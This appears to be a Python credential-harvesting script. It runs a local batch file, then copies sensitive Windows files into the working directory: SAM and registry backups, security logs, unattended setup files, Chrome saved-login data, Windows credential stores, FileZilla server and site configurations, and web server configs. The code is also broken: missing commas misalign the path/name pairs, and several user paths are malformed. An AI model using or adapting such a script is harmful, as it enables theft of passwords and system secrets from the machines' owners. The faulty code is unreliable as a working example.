import getpass
import os
import shutil
import subprocess


USER_NAME = getpass.getuser()
DESTINATION_PREFIX = "DATA\\" + USER_NAME

paths_and_name = [
    "%windir%\\repair", "Repair Info"
    "%windir%\\System32\\config", "Config Data"
    "%windir%\\system32\\logfiles\\httperr\\httperr1.log", "HTTP Logs"
    "%windir%\\iis6.log", "IIS6 Logs"
    "%windir%\\debug", "Debug Data"
    "%windir%\\System32\\drivers\\etc\\", "Driver Info"
    "%windir%\\repair\\sam", "SAM Backup",
    "%windir%\\System32\\config\\RegBack\\SAM", "SAM Registry Backup",
    "%windir%\\repair\\system", "System Backup",
    "%windir%\\repair\\software", "Software Backup",
    "%windir%\\repair\\security", "Security Backup",
    "%windir%\\debug\\NetSetup.log", "NetSetup Debug Log",
    "%windir%\\iis6.log", "IIS 6 Log",
    "%windir%\\system32\\logfiles\\httperr\\httperr1.log", "HTTP Error Log",
    "C:\\sysprep.inf", "Sysprep Configuration File",
    "C:\\sysprep\\sysprep.inf", "Sysprep Configuration File (Alternate)",
    "C:\\sysprep\\sysprep.xml", "Sysprep XML Configuration",
    "%windir%\\Panther\\Unattended.xml", "Unattended Windows Setup XML",
    "C:\\inetpub\\wwwroot\\Web.config", "IIS Web Configuration",
    "%windir%\\system32\\config\\AppEvent.Evt", "Application Event Log",
    "%windir%\\system32\\config\\SecEvent.Evt", "Security Event Log",
    "%windir%\\system32\\config\\default.sav", "Default Registry Backup",
    "%windir%\\system32\\config\\security.sav", "Security Registry Backup",
    "%windir%\\system32\\config\\software.sav", "Software Registry Backup",
    "%windir%\\system32\\config\\system.sav", "System Registry Backup",
    "%windir%\\system32\\inetsrv\\config\\applicationHost.config", "IIS Application Host Configuration",
    "%windir%\\system32\\inetsrv\\config\\schema\\ASPNET_schema.xml", "ASP.NET Schema XML",
    "%windir%\\System32\\drivers\\etc\\hosts", "Hosts File",
    "%windir%\\System32\\drivers\\etc\\networks", "Networks File",
    "C:\\inetpub\\logs\\LogFiles", "IIS Log Files",
    "C:\\inetpub\\wwwroot", "IIS Web Root",
    "C:\\inetpub\\wwwroot\\default.htm", "Default IIS Web Page",
    "C:\\laragon\\bin\\php\\php.ini", "Laragon PHP Configuration",
    "C:\\php\\php.ini", "PHP Configuration",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\FileZilla", "FileZilla Local Data",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\FileZilla\\cache.xml", "FileZilla Cache XML",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
    "Google Chrome Login Data",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat", "Windows User Class Data",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\Programs\\Microsoft VS Code\\updater.log", "VS Code Updater Log",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\Code\\User\\settings.json", "VS Code User Settings",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\Code\\User\\workspaceStorage", "VS Code Workspace Storage",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\filezilla-server.xml",
    "FileZilla Server Configuration",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\filezilla.xml", "FileZilla Client Configuration",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\logs", "FileZilla Logs",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\recentservers.xml", "FileZilla Recent Servers",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\sitemanager.xml", "FileZilla Site Manager",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\Microsoft\\Credentials", "Microsoft Credentials",
    "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Outlook", "Outlook User Data",
    "C:\\Users\\{DESTINATION_PREFIX}\\NTUSER.DAT", "NT User Profile",
    "C:\\wamp\\bin\\php\\php.ini", "WAMP PHP Configuration",
    "C:\\Windows\\php.ini", "Windows PHP Configuration",
    "C:\\Windows\\System32\\config\\NTUSER.DAT", "NT User Profile (System)",
    "C:\\Windows\\System32\\drivers\\etc\\hosts", "Hosts File (System)",
    "C:\\Windows\\System32\\inetsrv\\config\\administration.config", "IIS Administration Configuration",
    "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config", "IIS Application Host Configuration (System)",
    "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.hist", "IIS Application Host History",
    "C:\\Windows\\System32\\inetsrv\\config\\monitoring\\global.xml", "IIS Monitoring Configuration",
    "C:\\Windows\\System32\\inetsrv\\config\\redirection.config", "IIS Redirection Configuration",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\applicationHost.xsd", "IIS Application Host Schema",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\ASPNET_schema.xml", "ASP.NET Schema XML (System)",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\dotnetconfig.xsd", ".NET Configuration Schema",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\IISProvider_schema.xml", "IIS Provider Schema",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\IIS_schema.xml", "IIS Schema",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\rewrite_schema.xml", "Rewrite Schema",
    "C:\\Windows\\System32\\LogFiles\\W3SVC1", "IIS Log Files (W3SVC1)",
    "C:\\Windows\\system.ini", "System Configuration",
    "C:\\xampp\\apache\\conf\\extra\\httpd-ssl.conf", "Apache SSL Configuration",
    "C:\\xampp\\apache\\conf\\extra\\httpd-vhosts.conf", "Apache Virtual Hosts Configuration",
    "C:\\xampp\\apache\\conf\\httpd.conf", "Apache HTTP Server Configuration",
    "C:\\xampp\\apache\\logs\\access.log", "Apache Access Log",
    "C:\\xampp\\apache\\logs\\php_error_log", "Apache PHP Error Log",
    "C:\\xampp\\phpMyAdmin\\config.inc.php", "phpMyAdmin Configuration",
    "C:\\xampp\\php\\php.ini", "XAMPP PHP Configuration",
    "C:\\xampp\\xampp-control.log", "XAMPP Control Log"
]


def copy_and_rename_files(paths_and_name):
    for file_path, file_name in zip(paths_and_name[::2], paths_and_name[1::2]):
        try:
            file_path = os.path.expandvars(file_path)
            if not os.path.exists(file_path):
                print(f"The file {file_path} does not exist.")
                print()
                continue

            shutil.copy2(file_path, os.getcwd())
            new_file_name = f"{USER_NAME}_{file_name}"
            new_file_path = os.path.join(os.getcwd(), new_file_name)
            if os.path.exists(new_file_path):
                os.remove(new_file_path)  # Delete the existing file
            os.rename(os.path.join(os.getcwd(), os.path.basename(file_path)), new_file_path)
            print(f"INFO: Copied and renamed file to {new_file_name}")
            print()
        except FileNotFoundError:
            print(f"ERROR: The file at path {file_path} was not found.")
            print()
        except Exception as e:
            print(f"ERROR: An error occurred: {e}")
            print()


def execute_tree_batch_file():
    # Define the name of the batch file
    batch_file_name = "Tree_Command.bat"

    # Check if the batch file exists in the current working directory
    if os.path.exists(batch_file_name):
        # Construct the command to run the batch file
        command = [batch_file_name]

        # Run the batch file and wait for it to finish
        subprocess.run(command, check=True)
        print(f"INFO: {batch_file_name} has been executed successfully.")
        print()
    else:
        print(f"ERROR: {batch_file_name} not found in the current working directory.")
        print()


execute_tree_batch_file()
copy_and_rename_files(paths_and_name)
